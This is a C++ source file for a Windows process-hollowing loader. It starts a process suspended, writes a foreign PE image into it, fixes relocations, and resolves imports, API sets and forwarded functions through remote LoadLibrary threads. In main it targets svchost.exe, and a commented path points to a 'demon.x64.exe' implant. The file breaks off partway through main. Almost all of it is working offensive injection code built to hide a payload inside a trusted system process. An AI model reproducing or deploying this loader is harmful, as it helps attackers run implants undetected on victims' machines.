// process-hollowing.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#pragma once
#include "ProcessHollowingPE.h"

#define DATA_FREE( d, l ) \
    if ( d ) \
    { \
        memset( d, 0, l ); \
        LocalFree( d ); \
        d = NULL; \
    }

bool readPipe(HANDLE hPipe, PVOID* data, PDWORD dataLen)
{
	DWORD bytesSize = 0;


	// TODO: first get the size then parse
	if (PeekNamedPipe(hPipe, NULL, 0, NULL, &bytesSize, NULL))
	{
		if (bytesSize > 0)
		{
			_dbg("[SMB] BytesSize => %d\n", bytesSize);

			*data = LocalAlloc(LPTR, bytesSize + 1);
			memset(*data, 0, bytesSize + 1);

			if (ReadFile(hPipe, *data, bytesSize, &bytesSize, NULL))
			{
				_dbg("[SMB] BytesSize Read => %d\n", bytesSize);

			}
			else
			{
				_err("[SMB] ReadFile: Failed[%d]\n", GetLastError());
				DATA_FREE(*data, bytesSize);
				CloseHandle(hPipe);
				return false;
			}
		}
	}
	else
	{
		_err("[SMB] PeekNamedPipe: Failed[%d]\n", GetLastError());
		CloseHandle(hPipe);
		return false;
	}


	*dataLen = bytesSize;
	return true;
}

bool loadPEFromDisk(LPCSTR peName, LPVOID& peContent, PDWORD peSizeReturn)
{
	HANDLE hPe = NULL;
	hPe = CreateFileA(peName, GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);
	if (hPe == INVALID_HANDLE_VALUE || !hPe)
	{

		_err("[-] Error PE to load does not exist\r\n");
		return FALSE;

	}
	DWORD peSize = GetFileSize(hPe, NULL);
	*peSizeReturn = peSize;

	_dbg("[+] DLL %s loaded\r\n", peName);
	_dbg("[+] DLL size: %lu bytes \r\n", peSize);


	peContent = LocalAlloc(LPTR, peSize);
	if (peContent == NULL)
	{

		_err("[-] ERROR in allocating in HEAP\r\n");

		return FALSE;
	}
	if (!ReadFile(hPe, peContent, peSize, NULL, NULL))
	{

		_err("[-] ERROR copying Dll in HEAP \r\n");

		return FALSE;
	}

	_dbg("[+] Allocating size of Dll on the HEAP @ 0x%p\r\n", peContent);

	if (!CloseHandle(hPe))
	{

		_err("[-] ERROR in closing Handle on file %s", peName);

		return FALSE;
	}
	return TRUE;
}

PCHAR strConcat(PCHAR str1, PCHAR str2)
{
	SIZE_T size1 = strlen(str1);
	SIZE_T size2 = strlen(str2);
	PCHAR out = (PCHAR)LocalAlloc(LPTR, size1 + size2 + 2);
	if (!out)
		return nullptr;
	for (int i = 0; i < size1; i++)
	{
		out[i] = str1[i];
	}
	out[size1] = ' ';
	for (int i = 0; i < size2; i++)
	{
		out[i + size1 + 1] = str2[i];
	}
	return out;
}

bool launchSusprendedProcess(LPSTR processName, LPPROCESS_INFORMATION& pi, PCHAR args, HANDLE& hStdOutPipeRead)
{

	HANDLE hStdOutPipeWrite = NULL;
	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
	STARTUPINFOA si = { 0 };


	//Creating Pipe for output of exe
	if (!CreatePipe(&hStdOutPipeRead, &hStdOutPipeWrite, &sa, 0))
	{
		_err("[CMD] Failed Output pipe");
		return FALSE;
	}

	// Redirection STDOUT/STDERR into pipe
	si.cb = sizeof(STARTUPINFOA);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdError = hStdOutPipeWrite;
	si.hStdOutput = hStdOutPipeWrite;
	PCHAR cmdLine = strConcat(processName, args);
	if (!CreateProcessA(processName, cmdLine, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, pi))
	{
		_err("[-] ERROR: Cannot create process %s", processName);
		return FALSE;
	}
	_dbg("[+] Launching process %s with PID: %d\r\n", processName, pi->dwProcessId);
	return TRUE;
}

bool retrieveNtHeaders(PIMAGE_NT_HEADERS& ntHeaders, LPVOID peContent)
{
	PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)peContent;
	if (dosHeaders->e_magic != IMAGE_DOS_SIGNATURE)
	{

		_err("[-] ERROR: Input file seems to not be a PE\r\n");

		return FALSE;
	}
	ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dosHeaders + dosHeaders->e_lfanew);


	_dbg("[+] Dos Header: 0x%x\r\n", dosHeaders->e_magic);
	_dbg("[+] NT headers: 0x%p\r\n", ntHeaders);


	return TRUE;

}

bool copyPEinTargetProcess(HANDLE pHandle, LPVOID& allocAddrOnTarget, LPVOID peToInjectContent, PIMAGE_NT_HEADERS64 peInjectNtHeaders, PIMAGE_SECTION_HEADER& peToInjectRelocSection, PDWORD offsetRdata)
{

	peInjectNtHeaders->OptionalHeader.ImageBase = (DWORD64)allocAddrOnTarget;
	_dbg("[+] Writing Header into target process\r\n");
	if (!WriteProcessMemory(pHandle, allocAddrOnTarget, peToInjectContent, peInjectNtHeaders->OptionalHeader.SizeOfHeaders, NULL))
	{
		_err("[-] ERROR: Cannot write headers inside the target process. ERROR Code: %x\r\n", GetLastError());
		return FALSE;
	}
	_dbg("\t[+] Headers written at : 0x%p\n", allocAddrOnTarget);

	_dbg("[+] Writing section into target process\r\n");


	for (int i = 0; i < peInjectNtHeaders->FileHeader.NumberOfSections; i++)
	{
		PIMAGE_SECTION_HEADER currentSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)peInjectNtHeaders + 4 + sizeof(IMAGE_FILE_HEADER) + peInjectNtHeaders->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));

		if (!strcmp((char*)currentSectionHeader->Name, ".reloc"))
		{
			peToInjectRelocSection = currentSectionHeader;
			_dbg("\t[+] Reloc table found @ 0x%p offset\r\n", (LPVOID)(UINT64)currentSectionHeader->VirtualAddress);
		}

		if (!WriteProcessMemory(pHandle, (LPVOID)((UINT64)allocAddrOnTarget + currentSectionHeader->VirtualAddress), (LPVOID)((UINT64)peToInjectContent + currentSectionHeader->PointerToRawData), currentSectionHeader->SizeOfRawData, nullptr))
		{
			_err("[-] ERROR: Cannot write section %s in the target process. ERROR Code: %x\r\n", (char*)currentSectionHeader->Name, GetLastError());
			return FALSE;
		}
		_dbg("\t[+] Section %s written at : 0x%p.\n", (LPSTR)currentSectionHeader->Name, (LPVOID)((UINT64)allocAddrOnTarget + currentSectionHeader->VirtualAddress));
		if (!strcmp((char*)currentSectionHeader->Name, ".rdata"))
		{
			*offsetRdata = currentSectionHeader->VirtualAddress - currentSectionHeader->PointerToRawData;
		}

		if (!strcmp((char*)currentSectionHeader->Name, ".text"))
		{
			DWORD oldProtect = 0;
			if (!VirtualProtectEx(pHandle, (LPVOID)((UINT64)allocAddrOnTarget + currentSectionHeader->VirtualAddress), currentSectionHeader->SizeOfRawData, PAGE_EXECUTE_READ, &oldProtect))
			{
				_err("Error in changing permissions on .text sections to RX -> 0x%x\r\n", GetLastError());
				return FALSE;
			}
			_dbg("\t[+] Permissions changed to RX on .text section \r\n");
		}


	}
	return TRUE;
}

bool fixRelocTable(HANDLE pHandle, PIMAGE_SECTION_HEADER peToInjectRelocSection, LPVOID& allocAddrOnTarget, LPVOID peToInjectContent, DWORD64 DeltaImageBase, IMAGE_DATA_DIRECTORY relocationTable)
{
	_dbg("[+] Fixing relocation table.\n");
	if (peToInjectRelocSection == NULL)
	{
		_dbg("No Reloc Table\r\n");
		return TRUE;
	}

	DWORD RelocOffset = 0;
	while (RelocOffset < relocationTable.Size)
	{
		const auto currentReloc = (PIMAGE_BASE_RELOCATION)((DWORD64)peToInjectContent + peToInjectRelocSection->PointerToRawData + RelocOffset);
		RelocOffset += sizeof(IMAGE_BASE_RELOCATION);
		const DWORD NumberOfEntries = (currentReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);
		_dbg("[*] Number of relocation: %d\r\n", NumberOfEntries);

		for (DWORD i = 0; i < NumberOfEntries; i++)
		{
			const auto currentRelocEntry = (PBASE_RELOCATION_ENTRY)((DWORD64)peToInjectContent + peToInjectRelocSection->PointerToRawData + RelocOffset);
			RelocOffset += sizeof(BASE_RELOCATION_ENTRY);

			if (currentRelocEntry->Type == 0)
				continue;

			const DWORD64 AddressLocation = (DWORD64)allocAddrOnTarget + currentReloc->VirtualAddress + currentRelocEntry->Offset;
			DWORD64 PatchedAddress = 0;

			if (!ReadProcessMemory(pHandle, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD64), nullptr))
			{
				_err("[-] ERROR: Cannot read target process memory at %p, ERROR CODE: %x\r\n", (LPVOID)((UINT64)AddressLocation), GetLastError());
				return FALSE;
			}
			_dbg("\t[+] Address To Patch: %p -> Address Patched: %p \r\n", (VOID*)PatchedAddress, (VOID*)(PatchedAddress + DeltaImageBase));

			PatchedAddress += DeltaImageBase;

			if (!WriteProcessMemory(pHandle, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD64), nullptr))
			{
				_err("[-] ERROR: Cannot write into target process memory at %p, ERROR CODE: %x\r\n", (LPVOID)((UINT64)AddressLocation), GetLastError());
				return FALSE;
			}
		}
	}
	return TRUE;
}


PWSTR strToWstr(PCHAR str)
{
	SIZE_T size = strlen(str);
	PWSTR out = (PWSTR)LocalAlloc(LPTR, size * 2 + 2);
	if (!out)
		return nullptr;
	for (int i = 0; i < size; ++i)
		out[i] = str[i];
	return out;
}

BOOL resolveAPISet(PWCHAR apiToResolve, PWCHAR& apiResolved)
{

	PPEB peb = (PPEB)__readgsqword(0x60);
	PAPI_SET_NAMESPACE apiMap = (PAPI_SET_NAMESPACE)peb->Reserved9[0];
	PWSTR ApiStrName = nullptr;
	PAPI_SET_NAMESPACE_ENTRY ApiMapEntry = PAPI_SET_NAMESPACE_ENTRY(apiMap->EntryOffset + (PBYTE)apiMap);
	for (int i = 0; i < apiMap->Count; ++i)
	{
		int len = lstrlenW(apiToResolve) * 2 - 5 * 2;
		ApiStrName = (PWSTR)((PBYTE)apiMap + ApiMapEntry->NameOffset);
		if (!memcmp(ApiStrName, apiToResolve, len))
		{
			PAPI_SET_VALUE_ENTRY ApiValueEntry = (PAPI_SET_VALUE_ENTRY)((PBYTE)apiMap + ApiMapEntry->ValueOffset);
			apiResolved = (PWCHAR)LocalAlloc(LPTR, ApiValueEntry->ValueLength + 2);
			memcpy(apiResolved, (PWSTR)((PBYTE)apiMap + ApiValueEntry->ValueOffset), ApiValueEntry->ValueLength);

			_dbg("ApiSetName: %ws -> ApiResolved: %ws \r\n", apiToResolve, apiResolved);
			return TRUE;
		}
		ApiMapEntry++;
	}
	_err("Error in resolving API Set name: %ws \r\n", apiToResolve);
	return FALSE;

}


HANDLE getSnapShotProcess(int pid) {

	HANDLE mod;

	mod = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
	if (mod == INVALID_HANDLE_VALUE) {
		_err("CreateToolhelp32Snapshot error %x\r\n", GetLastError());
		return nullptr;
	}

	return mod;

}

MODULEENTRY32W getModuleEntry(HANDLE snapShotHandle, PWSTR moduleSearched)
{
	MODULEENTRY32 me32;
	me32.dwSize = sizeof(MODULEENTRY32);
	if (!Module32First(snapShotHandle, &me32)) {
		return { 0 };
	}
	do {
		if (!lstrcmpiW(me32.szModule, moduleSearched))
		{
			return me32;
		}
	} while (Module32Next(snapShotHandle, &me32));
	return { 0 };
}

PVOID getAddrFunction(HMODULE lib, PCHAR functionName, PCHAR& forwardedLib, PCHAR& forwardedName)
{
	DWORD forwardSize = 0;
	DWORD forwardOffset = 0;
	CHAR forwardName[MAX_PATH] = { 0 };

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)lib;
	PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)lib + dosHeader->e_lfanew);
	DWORD_PTR exportDirectoryRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	SIZE_T exportDirectorySize = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
	PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)lib + exportDirectoryRVA);
	PDWORD addressOfFunctionsRVA = (PDWORD)((DWORD_PTR)lib + imageExportDirectory->AddressOfFunctions);

	// Recuperation du tableau des noms des fonctions exportees
	PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)lib + imageExportDirectory->AddressOfNames);

	// Recuperation de l'ordinal des fonctions exportees
	PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)lib + imageExportDirectory->AddressOfNameOrdinals);

	// Recuperation des tableaux de fonctions exportees
	for (DWORD i = 0; i < imageExportDirectory->NumberOfFunctions; i++)
	{
		PSTR name = (PSTR)((PBYTE)lib + addressOfNamesRVA[i]);
		WORD ordinalName = (WORD)((PBYTE)lib + addressOfNameOrdinalsRVA[i]);
		PVOID addr = (PVOID)((PBYTE)lib + addressOfFunctionsRVA[ordinalName]);
		if (!strcmp(functionName, name))
		{
			if ((UINT_PTR)addr >= (UINT_PTR)imageExportDirectory && (UINT_PTR)addr < (UINT_PTR)imageExportDirectory + exportDirectorySize)
			{
				forwardSize = strlen((PCHAR)addr);
				memcpy(forwardName, (PCHAR)addr, forwardSize);

				// The forwardName has a format of DLLNAME.FunctionName so we split with '.'
				for (forwardOffset = 0; forwardOffset < forwardSize; forwardOffset++) {
					if (forwardName[forwardOffset] == '.') {
						forwardName[forwardOffset] = 0;
						break;
					}
				}
				if (!forwardedLib)
					forwardedLib = (PCHAR)LocalAlloc(LPTR, strlen(forwardName) + 1 + 4);
				else
					forwardedLib = (PCHAR)LocalReAlloc(forwardedLib, strlen(forwardName) + 1 + 4, LMEM_MOVEABLE | LMEM_ZEROINIT);

				forwardedLib[strlen(forwardName)] = '.';
				forwardedLib[strlen(forwardName) + 1] = 'd';
				forwardedLib[strlen(forwardName) + 2] = 'l';
				forwardedLib[strlen(forwardName) + 3] = 'l';

				if (!forwardedName)
					forwardedName = (PCHAR)LocalAlloc(LPTR, forwardSize - strlen(forwardName) + 1);
				else
					forwardedName = (PCHAR)LocalReAlloc(forwardedName, forwardSize - strlen(forwardName) + 1, LMEM_MOVEABLE | LMEM_ZEROINIT);
				memcpy(forwardedLib, forwardName, strlen(forwardName));
				memcpy(forwardedName, forwardName + forwardOffset + 1, forwardSize - strlen(forwardName));


				return getAddrFunction(LoadLibraryA(forwardedLib), forwardedName, forwardedLib, forwardedName);
			}
			return addr;
		}

	}
	return nullptr;
}

bool remoteLoadLibrary(HANDLE hProcess, PCHAR libToLoad)
{
	PVOID addr = VirtualAllocEx(hProcess, NULL, strlen(libToLoad) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!addr)
	{
		_err("Error allocating memory into process 0x%x\r\n", GetLastError());
		return FALSE;
	}
	if (!WriteProcessMemory(hProcess, addr, libToLoad, strlen(libToLoad) + 1, NULL))
	{
		_err("Error in writing into process @0x%p -> 0x%x\r\n", addr, GetLastError());
		return FALSE;
	}
	PVOID loadlib = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadlib, addr, 0, NULL);
	if (hThread == INVALID_HANDLE_VALUE or !hThread)
	{
		_err("Error in creating remote thread 0x%x\r\n", GetLastError());
		return FALSE;
	}
	WaitForSingleObject(hThread, INFINITE);
	return TRUE;
}

bool loadImportTableLibs(LPVOID pImage, PIMAGE_NT_HEADERS64 ntHeaders, LPPROCESS_INFORMATION pi, PVOID allocAddrOnTarget, DWORD offsetRdata)
{

	PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
	IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	if (importsDirectory.Size <= 20)
	{
		_dbg("[*] Empty IAT");
		return TRUE;
	}

	importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress - offsetRdata + (PBYTE)pImage);


	_dbg("[*] Get Import Directory Table at %p\r\n", importDescriptor);


	LPSTR libName = NULL;
	HMODULE lib = NULL;

	while (importDescriptor->Name != NULL)
	{
		libName = (LPSTR)(importDescriptor->Name + (DWORD_PTR)pImage - offsetRdata);

		_dbg("[*] library to load: %s\r\n", libName);

		if (!remoteLoadLibrary(pi->hProcess, libName))
			return FALSE;

		lib = LoadLibraryA(libName);

		// Find forwarded functions

		if (lib)
		{
			PIMAGE_THUNK_DATA thunk = NULL;
			thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)pImage + importDescriptor->FirstThunk - offsetRdata);

			while (thunk->u1.AddressOfData != NULL)
			{
				if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
				{
					LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);
				}
				else
				{
					PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)pImage + thunk->u1.AddressOfData - offsetRdata);
					PCHAR forwardedLib = nullptr;
					PCHAR forwardedName = nullptr;
					PVOID addr = getAddrFunction(lib, functionName->Name, forwardedLib, forwardedName);
					if (forwardedLib && forwardedName)
					{
						_dbg("Forwarded function found: %s. Need to import lib %s\r\n", functionName->Name, forwardedLib);
						if (!remoteLoadLibrary(pi->hProcess, forwardedLib))
							return FALSE;

					}
				}
				thunk++;
			}
		}
		importDescriptor++;

	}
	return TRUE;
}

bool loadDelayedImportTableLibs(LPVOID pImage, PIMAGE_NT_HEADERS64 ntHeaders, LPPROCESS_INFORMATION pi, PVOID allocAddrOnTarget, DWORD offsetRdata)
{

	PIMAGE_DELAYLOAD_DESCRIPTOR delayedImportDescriptor = NULL;
	IMAGE_DATA_DIRECTORY delayedImportsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT];
	if (delayedImportsDirectory.VirtualAddress == 0)
		return TRUE;
	delayedImportDescriptor = (PIMAGE_DELAYLOAD_DESCRIPTOR)(delayedImportsDirectory.VirtualAddress - offsetRdata + (PBYTE)pImage);


	_dbg("[*] Get Delayed Import Directory Table at %p\r\n", delayedImportDescriptor);


	LPSTR libName = NULL;
	HMODULE lib = NULL;

	while (delayedImportDescriptor->DllNameRVA != NULL)
	{
		libName = (LPSTR)(delayedImportDescriptor->DllNameRVA - offsetRdata + (DWORD_PTR)pImage);
		_dbg("[*] Delayed Import to load: %s\r\n", libName);

		if (!remoteLoadLibrary(pi->hProcess, libName))
			return FALSE;

		lib = LoadLibraryA(libName);

		// Find forwarded functions

		if (lib)
		{
			PIMAGE_THUNK_DATA thunkName = NULL;
			thunkName = (PIMAGE_THUNK_DATA)((DWORD_PTR)pImage - offsetRdata + delayedImportDescriptor->ImportNameTableRVA);

			while (thunkName->u1.AddressOfData != NULL)
			{
				if (IMAGE_SNAP_BY_ORDINAL(thunkName->u1.Ordinal))
				{
					LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunkName->u1.Ordinal);
					_dbg("\tFunction number %d to import\r\n", thunkName->u1.Ordinal);
				}
				else
				{
					PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)pImage - offsetRdata + thunkName->u1.AddressOfData);
					PCHAR forwardedLib = nullptr;
					PCHAR forwardedName = nullptr;
					PVOID addr = getAddrFunction(lib, functionName->Name, forwardedLib, forwardedName);
					if (forwardedLib && forwardedName)
					{
						_dbg("Forwarded function found: %s. Need to import lib %s\r\n", functionName->Name, forwardedLib);
						if (!remoteLoadLibrary(pi->hProcess, forwardedLib))
							return FALSE;

					}
					_dbg("\tFunction %s to import\r\n", functionName->Name);
				}
				thunkName++;
			}
		}
		delayedImportDescriptor++;
	}

	return TRUE;
}

bool fixImports(LPVOID pImage, PIMAGE_NT_HEADERS64 ntHeaders, LPPROCESS_INFORMATION pi, PVOID allocAddrOnTarget, DWORD offsetRdata, HANDLE mod)
{
	_dbg("[*] Fixing Import table\r\n");

	PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
	IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	if (importsDirectory.Size <= 20)
	{
		_dbg("[*] Empty IAT");
		return TRUE;
	}
	HMODULE lib = nullptr;

	importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress - offsetRdata + (PBYTE)pImage);


	while (importDescriptor->Name != NULL)
	{
		PWSTR moduleSearched = strToWstr((LPSTR)(importDescriptor->Name - offsetRdata + (DWORD_PTR)pImage));
		lib = LoadLibraryW(moduleSearched);
		if (!lib)
		{
			_err("Error in retrieving locally the lib %ws -> 0x%x\r\n", moduleSearched, GetLastError());
			return FALSE;
		}
		MODULEENTRY32W me32 = getModuleEntry(mod, moduleSearched);
		if (me32.modBaseAddr == 0)
		{
			PWSTR apiSetResolved = nullptr;
			resolveAPISet(moduleSearched, apiSetResolved);
			me32 = getModuleEntry(mod, apiSetResolved);
		}
		_dbg("Import found %ws -> %ws @ 0x%p \r\n", moduleSearched, me32.szModule, me32.modBaseAddr);
		if (me32.modBaseAddr != 0)
		{
			PIMAGE_THUNK_DATA thunk = NULL;
			thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)pImage + importDescriptor->FirstThunk - offsetRdata);

			while (thunk->u1.AddressOfData != NULL)
			{
				if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
				{
					LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);

					PVOID remoteAddr = (PVOID)((PBYTE)(&thunk->u1.Function) + offsetRdata - (PBYTE)pImage + (PBYTE)allocAddrOnTarget);
					PVOID localAddr = (PBYTE)GetProcAddress(lib, functionOrdinal);
					DWORD offset = (PBYTE)localAddr - (PBYTE)lib;
					ULONGLONG addrFix = (ULONGLONG)((PBYTE)me32.modBaseAddr + offset);

					if (!WriteProcessMemory(pi->hProcess, remoteAddr, &addrFix, sizeof(ULONGLONG), NULL))
					{
						_err("Error in fixing address of function number %d -> 0x%x\r\n", thunk->u1.Ordinal, GetLastError());
						return FALSE;
					}


					_dbg("\t[*] Imported function number %d @ 0x%p\r\n", thunk->u1.Ordinal, addrFix);

				}
				else
				{
					PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)pImage + thunk->u1.AddressOfData - offsetRdata);
					PVOID remoteAddr = (PVOID)((PBYTE)(&thunk->u1.Function) + offsetRdata - (PBYTE)pImage + (PBYTE)allocAddrOnTarget);

					PCHAR forwardedName = nullptr;
					PCHAR forwardedLib = nullptr;

					PVOID addrFunc = getAddrFunction(lib, functionName->Name, forwardedLib, forwardedName);
					DWORD offset = 0;
					ULONGLONG addrFix = 0;
					if (forwardedLib && forwardedName)
					{

						PWSTR forwardedLibWstr = strToWstr(forwardedLib);

						MODULEENTRY32W fwMe32 = getModuleEntry(mod, forwardedLibWstr);
						if (fwMe32.modBaseAddr == 0)
						{
							PWSTR apiSetResolved = nullptr;
							resolveAPISet(forwardedLibWstr, apiSetResolved);
							fwMe32 = getModuleEntry(mod, apiSetResolved);
							if (fwMe32.modBaseAddr == 0)
							{
								_err("Error in resolving the forwarded lib %ws\r\n", forwardedLibWstr);
								return FALSE;
							}
						}

						HMODULE fwLib = LoadLibraryA(forwardedLib);
						offset = (PBYTE)addrFunc - (PBYTE)fwLib;
						addrFix = (ULONGLONG)((PBYTE)fwMe32.modBaseAddr + offset);
						_dbg("[FORWARDED FUNCTION] %s is a forwarded function in %ws @ 0x%p\r\n", functionName->Name, fwMe32.szModule, fwMe32.modBaseAddr);

					}
					else
					{
						offset = (PBYTE)addrFunc - (PBYTE)lib;
						addrFix = (ULONGLONG)((PBYTE)me32.modBaseAddr + offset);
					}


					if (!WriteProcessMemory(pi->hProcess, remoteAddr, &addrFix, sizeof(ULONGLONG), NULL))
					{
						_err("Error in fixing address of function %s -> 0x%x\r\n", functionName->Name, GetLastError());
						return FALSE;
					}


					_dbg("\t[*] Imported function %s @ 0x%p\r\n", functionName->Name, addrFix);

				}
				thunk++;
			}
		}
		importDescriptor++;
	}
	return TRUE;
}

bool fixDelayedImports(LPVOID pImage, PIMAGE_NT_HEADERS64 ntHeaders, LPPROCESS_INFORMATION pi, PVOID allocAddrOnTarget, DWORD offsetRdata, HANDLE mod)
{

	_dbg("[*] Fixing Delayed Import table\r\n");
	HMODULE lib;
	PIMAGE_DELAYLOAD_DESCRIPTOR delayedImportDescriptor = NULL;
	IMAGE_DATA_DIRECTORY delayedImportsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT];
	if (delayedImportsDirectory.VirtualAddress == 0)
		return TRUE;
	delayedImportDescriptor = (PIMAGE_DELAYLOAD_DESCRIPTOR)(delayedImportsDirectory.VirtualAddress - offsetRdata + (PBYTE)pImage);
	lib = nullptr;

	while (delayedImportDescriptor->DllNameRVA != NULL)
	{
		PWSTR moduleSearched = strToWstr((LPSTR)(delayedImportDescriptor->DllNameRVA - offsetRdata + (DWORD_PTR)pImage));
		lib = LoadLibraryW(moduleSearched);
		if (!lib)
		{
			_err("Error in retrieving locally the lib %ws -> 0x%x\r\n", moduleSearched, GetLastError());
			return FALSE;
		}
		MODULEENTRY32W me32 = getModuleEntry(mod, moduleSearched);
		if (me32.modBaseAddr == 0)
		{
			PWSTR apiSetResolved = nullptr;
			resolveAPISet(moduleSearched, apiSetResolved);
			me32 = getModuleEntry(mod, apiSetResolved);
		}
		_dbg("Import found %ws -> %ws @ 0x%p \r\n", moduleSearched, me32.szModule, me32.modBaseAddr);
		if (me32.modBaseAddr != 0)
		{
			PIMAGE_THUNK_DATA thunkFct = NULL;
			PIMAGE_THUNK_DATA thunkName = NULL;
			thunkFct = (PIMAGE_THUNK_DATA)((DWORD_PTR)pImage + delayedImportDescriptor->ImportAddressTableRVA - offsetRdata);
			thunkName = (PIMAGE_THUNK_DATA)((DWORD_PTR)pImage + delayedImportDescriptor->ImportNameTableRVA - offsetRdata);

			while (thunkName->u1.AddressOfData != NULL)
			{
				if (IMAGE_SNAP_BY_ORDINAL(thunkName->u1.Ordinal))
				{
					LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunkName->u1.Ordinal);

					PVOID remoteAddr = (PVOID)((PBYTE)(&thunkFct->u1.Function) + offsetRdata - (PBYTE)pImage + (PBYTE)allocAddrOnTarget);
					PVOID localAddr = (PBYTE)GetProcAddress(lib, functionOrdinal);
					DWORD offset = (PBYTE)localAddr - (PBYTE)lib;
					ULONGLONG addrFix = (ULONGLONG)((PBYTE)me32.modBaseAddr + offset);

					if (!WriteProcessMemory(pi->hProcess, remoteAddr, &addrFix, sizeof(ULONGLONG), NULL))
					{
						_err("Error in fixing address of function number %d -> 0x%x\r\n", thunkName->u1.Ordinal, GetLastError());
						return FALSE;
					}


					_dbg("\t[*] Imported function number %d @ 0x%p\r\n", thunkName->u1.Ordinal, addrFix);

				}
				else
				{
					PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)pImage + thunkName->u1.AddressOfData - offsetRdata);
					PVOID remoteAddr = (PVOID)((PBYTE)(&thunkFct->u1.Function) + offsetRdata - (PBYTE)pImage + (PBYTE)allocAddrOnTarget);

					PCHAR forwardedName = nullptr;
					PCHAR forwardedLib = nullptr;

					PVOID addrFunc = getAddrFunction(lib, functionName->Name, forwardedLib, forwardedName);
					DWORD offset = 0;
					ULONGLONG addrFix = 0;
					if (forwardedLib && forwardedName)
					{

						PWSTR forwardedLibWstr = strToWstr(forwardedLib);

						MODULEENTRY32W fwMe32 = getModuleEntry(mod, forwardedLibWstr);
						if (fwMe32.modBaseAddr == 0)
						{
							PWSTR apiSetResolved = nullptr;
							resolveAPISet(forwardedLibWstr, apiSetResolved);
							fwMe32 = getModuleEntry(mod, apiSetResolved);
							if (fwMe32.modBaseAddr == 0)
							{
								_err("Error in resolving the forwarded lib %ws\r\n", forwardedLibWstr);
								return FALSE;
							}
						}

						HMODULE fwLib = LoadLibraryA(forwardedLib);
						offset = (PBYTE)addrFunc - (PBYTE)fwLib;
						addrFix = (ULONGLONG)((PBYTE)fwMe32.modBaseAddr + offset);
						_dbg("[FORWARDED FUNCTION] %s is a forwarded function in %ws @ 0x%p\r\n", functionName->Name, fwMe32.szModule, fwMe32.modBaseAddr);

					}
					else
					{
						offset = (PBYTE)addrFunc - (PBYTE)lib;
						addrFix = (ULONGLONG)((PBYTE)me32.modBaseAddr + offset);
					}


					if (!WriteProcessMemory(pi->hProcess, remoteAddr, &addrFix, sizeof(ULONGLONG), NULL))
					{
						_err("Error in fixing address of function %s -> 0x%x\r\n", functionName->Name, GetLastError());
						return FALSE;
					}


					_dbg("\t[*] Imported function %s @ 0x%p\r\n", functionName->Name, addrFix);

				}
				thunkName++;
				thunkFct++;
			}
		}
		delayedImportDescriptor++;
	}


	CloseHandle(mod);
	return TRUE;

}

int main(int argc, char** argv)
{

	// create destination process - this is the process to be hollowed out
	PIMAGE_NT_HEADERS64 peInjectNtHeaders = NULL;
	LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();

	LPCSTR peInject = argv[1];
	PCHAR args = argv[2];
	//LPCSTR peInject = "C:\\Users\\user\\Downloads\\demon.x64.exe";
	//LPCSTR peInject = "C:\\Users\\user\\source\\repos\\MsgBox\\x64\\Release\\MsgBox.exe";
	LPCSTR target = "C:\\Windows\\System32\\svchost.exe";

